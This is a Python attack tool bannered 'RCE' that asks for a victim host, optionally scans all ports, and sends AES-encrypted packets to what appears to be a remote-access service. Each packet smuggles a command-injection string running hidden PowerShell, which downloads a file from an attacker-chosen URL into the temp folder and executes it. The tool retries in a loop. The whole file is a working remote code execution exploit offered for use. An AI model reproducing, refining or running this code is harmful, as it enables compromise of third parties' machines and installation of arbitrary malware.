import socket,io,random,string,hashlib,os,sys,time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from colorama import Fore,init
init(autoreset=True)

def clr():
 os.system('cls' if sys.platform=='win32' else 'clear')

def gid(l):
 return ''.join(random.choice(string.ascii_uppercase+string.digits) for _ in range(l))

class Q:
 def __init__(self,d):
  self.d=d
 def gb(self):
  b=io.BytesIO()
  b.write(b'<Kkmm>'.join(self.d))
  return b.getbuffer().tobytes()

def snd(s,p,k):
 try:
  h=hashlib.md5(k.encode('utf-8')).digest()
  c=AES.new(h,AES.MODE_ECB)
  e=c.encrypt(pad(p.gb(),16))
  s.send(str(len(e)).encode('utf-8')+b'\x00')
  s.send(e)
  return 1
 except:
  return 0

def run(h,po,k,fu):
 s=None
 try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(10)
  s.connect((h,po))
  print(Fore.GREEN+f"[+] ok {h}"+Fore.RESET)
  cid=gid(16)
  hp=Q([b'hand',cid.encode()])
  if not snd(s,hp,k):
   print(Fore.RED+"[+] no"+Fore.RESET)
   s.close()
   return 0
  fe='.bat' if fu.lower().endswith('.bat') else '.exe'
  rn=gid(5)+fe
  if fe=='.bat':
   ps=f'start powershell.exe -WindowStyle Hidden $url="{fu}"; $o="$env:TEMP\\{rn}"; iwr -Uri $url -OutFile $o; Start-Process -FilePath cmd.exe -ArgumentList /c,$o'
  else:
   ps=f'start powershell.exe -WindowStyle Hidden $url="{fu}"; $o="$env:TEMP\\{rn}"; iwr -Uri $url -OutFile $o; Start-Sleep -s 3; cmd.exe /c start "" $o'
  ep=Q([b'hand+',cid.encode(),b' xx',f'" & {ps}'.encode(),b'1:1'])
  if not snd(s,ep,k):
   print(Fore.RED+"[+] no"+Fore.RESET)
   s.close()
   return 0
  s.close()
  return 1
 except:
  print(Fore.RED+"[+] no"+Fore.RESET)
 finally:
  if s:
   try:
    s.close()
   except:
    pass
 return 0

def banner():
 print(Fore.MAGENTA+"""
   ██████╗  ██████╗ ███████╗
   ██╔══██╗██╔════╝ ██╔════╝
   ██████╔╝██║      █████╗  
   ██╔══██╗██║      ██╔══╝  
   ██║  ██║╚██████╗ ███████╗
   ╚═╝  ╚═╝ ╚═════╝ ╚══════╝
           Made By EpicDxoma ~ Fuck Skids
"""+Fore.RESET)

def main():
 clr()
 banner()
 print(Fore.MAGENTA+"[+] enter victim info "+Fore.RESET)
 h=input(Fore.MAGENTA+"[+] host: "+Fore.RESET)
 print(Fore.MAGENTA+"[+] 1 port"+Fore.RESET)
 print(Fore.MAGENTA+"[+] 2 scan"+Fore.RESET)
 m=input(Fore.MAGENTA+"[+] 1/2: "+Fore.RESET)
 po=None
 if m=='1':
  po=int(input(Fore.MAGENTA+"[+] port: "+Fore.RESET))
 elif m=='2':
  po=None
 else:
  print(Fore.MAGENTA+"[+] wrong"+Fore.RESET)
  return
 k=input(Fore.MAGENTA+"[+] key: "+Fore.RESET)
 if not k:
  k="<123456789>"
 fu=input(Fore.MAGENTA+"[+] url: "+Fore.RESET)
 print(Fore.MAGENTA+f"\n[+] target {h}"+Fore.RESET)
 if m=='1':
  print(Fore.MAGENTA+f"[+] port {po}"+Fore.RESET)
  print(Fore.MAGENTA+f"[+] key {k}"+Fore.RESET)
  print(Fore.MAGENTA+f"[+] url {fu}"+Fore.RESET)
  print(Fore.MAGENTA+"[+] go\n"+Fore.RESET)
  while 1:
   run(h,po,k,fu)
   time.sleep(5)
 elif m=='2':
  print(Fore.MAGENTA+"[+] scan 1-65535"+Fore.RESET)
  print(Fore.MAGENTA+f"[+] key {k}"+Fore.RESET)
  print(Fore.MAGENTA+f"[+] url {fu}"+Fore.RESET)
  print(Fore.MAGENTA+"[+] start\n"+Fore.RESET)
  while 1:
   for p in range(1,65536):
    try:
     ts=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     ts.settimeout(0.3)
     if ts.connect_ex((h,p))==0:
      print(Fore.GREEN+f"[+] {h}:{p} open"+Fore.RESET)
      run(h,p,k,fu)
     ts.close()
    except:
     pass
    if p%1000==0:
     print(Fore.YELLOW+f"[+] {p}/65535"+Fore.RESET)
   print(Fore.YELLOW+"[+] again\n"+Fore.RESET)
   time.sleep(30)

if __name__=="__main__":
 try:
  main()
 except KeyboardInterrupt:
  print(Fore.RED+"\n[+] exit"+Fore.RESET)
 except Exception as e:
  print(Fore.RED+f"[+] err {e}"+Fore.RESET)
